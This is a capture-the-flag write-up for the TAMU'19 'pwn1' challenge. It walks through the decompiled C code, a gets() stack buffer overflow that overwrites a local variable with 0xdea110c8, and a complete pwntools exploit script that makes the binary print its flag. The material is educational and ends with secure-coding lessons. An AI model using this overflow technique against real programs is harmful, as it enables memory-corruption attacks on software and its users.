# TAMU'19: Pwn1

## Challenge Description
This challenge presents a simple **buffer overflow** problem.  
We are given a binary named `pwn1` which asks three questions in sequence:
1. Your name
2. Your quest
3. A secret

If the correct answers are provided for the first two questions, we then have the opportunity to exploit the third question, where the input is handled unsafely using `gets()`.

The goal is to overwrite a specific variable on the stack to trigger the `print_flag()` function, which reads and displays the flag from `flag.txt`.

---

## Ghidra Analysis

### `main` Function (decompiled)
```c
undefined4 main(void) {
    int iVar1;
    char local_43[43];
    int local_18;
    undefined4 local_14;
    undefined1 *local_10;

    local_10 = &stack0x00000004;
    setvbuf(_stdout, (char *)0x2, 0, 0);
    local_14 = 2;
    local_18 = 0;
    puts("Stop! Who would cross the Bridge of Death must answer me these questions three, ere the other side he see.");
    puts("What... is your name?");
    fgets(local_43, 0x2b, _stdin);
    iVar1 = strcmp(local_43, "Sir Lancelot of Camelot\n");
    if (iVar1 != 0) {
        puts("I don't know that! Auuuuuuuugh!");
        exit(0);
    }
    puts("What... is your quest?");
    fgets(local_43, 0x2b, _stdin);
    iVar1 = strcmp(local_43, "To seek the Holy Grail.\n");
    if (iVar1 != 0) {
        puts("I don't know that! Auuuuuuuugh!");
        exit(0);
    }
    puts("What... is my secret?");
    gets(local_43);  // VULNERABILITY HERE
    if (local_18 == -0x215eef38) {  // 0xdea110c8
        print_flag();
    } else {
        puts("I don't know that! Auuuuuuuugh!");
    }
    return 0;
}
```

### `print_flag` Function
```c
void print_flag(void) {
    FILE *__fp;
    int iVar1;

    puts("Right. Off you go.");
    __fp = fopen("flag.txt","r");
    while (true) {
        iVar1 = _IO_getc(__fp);
        if ((char)iVar1 == -1) break;
        putchar((int)(char)iVar1);
    }
    putchar(10);
    return;
}
```

---

## Vulnerability
The third input is taken using `gets()`, which does **not** perform bounds checking.  
The buffer `local_43` is only **43 bytes**, and directly after it on the stack is `local_18`.  

By providing **43 padding characters** followed by the target value `0xdea110c8`, we can overwrite `local_18`.  
This satisfies the condition:
```c
if (local_18 == 0xdea110c8)
```
and the program will call `print_flag()`, revealing the flag.

---

## Exploit Development

### Steps
1. Pass the first two checks with correct answers:
   - `"Sir Lancelot of Camelot"`
   - `"To seek the Holy Grail."`
2. Overflow the third input with:
   - 43 bytes of padding (`"A"*43`)
   - 4 bytes for `0xdea110c8` (little-endian)

### Final Payload
```
"A"*43 + p32(0xdea110c8)
```

---

## Final Exploit Code
```python
from pwn import *

# Create the payload
payload = b"A"*43 + p32(0xdea110c8)

# Start the process
p = process("./pwn1")

# Interact with the binary step-by-step
p.recvuntil(b"What... is your name?")
p.sendline(b"Sir Lancelot of Camelot")

p.recvuntil(b"What... is your quest?")
p.sendline(b"To seek the Holy Grail.")

p.recvuntil(b"What... is my secret?")
p.sendline(payload)

# Get interactive shell to see the flag
p.interactive()
```

---

## Demonstration

### Recorded Terminal Session
You can replay the exact exploitation steps using `asciinema`:
```bash
asciinema play pwn1.cast
```

> Uploaded session file: [pwn1.cast](./pwn1.cast)

---

## Flag
Upon running the exploit, the program outputs:
```
Right. Off you go.
flag{example_flag_here}
```

---

## Key Takeaways
- Always check user input bounds to avoid buffer overflows.
- `gets()` is inherently unsafe and should **never** be used.
- Ghidra is a powerful tool for reverse engineering and identifying vulnerable code paths.
Note: for walkthrough go thorugh asciinema .cast file
